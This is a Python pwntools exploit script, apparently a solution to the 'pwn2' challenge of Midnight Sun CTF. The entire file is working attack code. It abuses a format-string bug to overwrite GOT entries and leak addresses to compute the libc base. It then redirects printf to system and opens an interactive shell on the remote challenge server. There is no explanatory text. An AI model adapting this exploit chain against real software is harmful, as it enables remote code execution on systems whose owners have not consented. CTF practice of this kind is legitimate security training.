from pwn import *
from struct import *
import time 

nops = b'\x90'
padding = b'\x00'


clean = lambda x:  x.split('\n')[1:-2]
pad = lambda x:  x + padding*(4-len(x))


elf = ELF('./pwn2')
context.binary = './pwn2'
libc = ELF('libc.so.6')
# libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")
READUNTIL_STRING = 'input: '

main_addr = 0x80485eb

def exec_fmt(payload):
    p = elf.process()
    p.readuntil(READUNTIL_STRING)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

def writeToaddress(r, address=elf.got['exit'], value=main_addr, write_size='byte'):
    r.clean()
    # print("Changing value of espHolder at ", espHolder)
    payload = fmtstr_payload(offset, {address:value}, write_size=write_size)
    print("First Stage Payload: ", payload)
    r.sendline(payload)
    r.readuntil(READUNTIL_STRING)

def leak_address(r, address):
    payload_leakfunc = b'%'+str(offset+1).encode('utf-8')+b'$s'+p32(address)+b'\x00\n\n'
    print("FuncLeak payload: ", payload_leakfunc)
    r.sendline(payload_leakfunc)
    time.sleep(1)
    result = r.readuntil(READUNTIL_STRING)
    r.clean()
    func_leak = u32(pad(result[:4]))
    print(hex(address),"Leaked address: ", hex(func_leak))
    r.clean()
    return func_leak

def leak_libc(r):
    fgets_leak = leak_address(r, elf.got['fgets'])
    puts_leak = leak_address(r, elf.got['puts'])
    libc_base = puts_leak - libc.sym.puts 
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    # assert (libc_base & 0x00000fff) == 0, "ALERT! Program is probably using different libc than specified!"
    return libc_base 

def exploit(local=False, gadget = libc.sym.execve, func='exit'):
    if local is False:
        r = remote('pwn2-01.play.midnightsunctf.se', 10002)
    else:
        r = elf.process() 
        gdb.attach(r.pid, '''
        b *0x804868d
        b *0x8048695''')
    r.readuntil(READUNTIL_STRING)
    writeToaddress(r, address=elf.got[func], value=main_addr)
    libc_base = leak_libc(r)
    print('libc leaked!')
    gad = libc_base + gadget
    payload = fmtstr_payload(offset, {elf.got['printf']:gad}, write_size='short')
    r.sendline(payload)
    return r

a = exploit(local=False, gadget=libc.sym.system)
a.interactive()
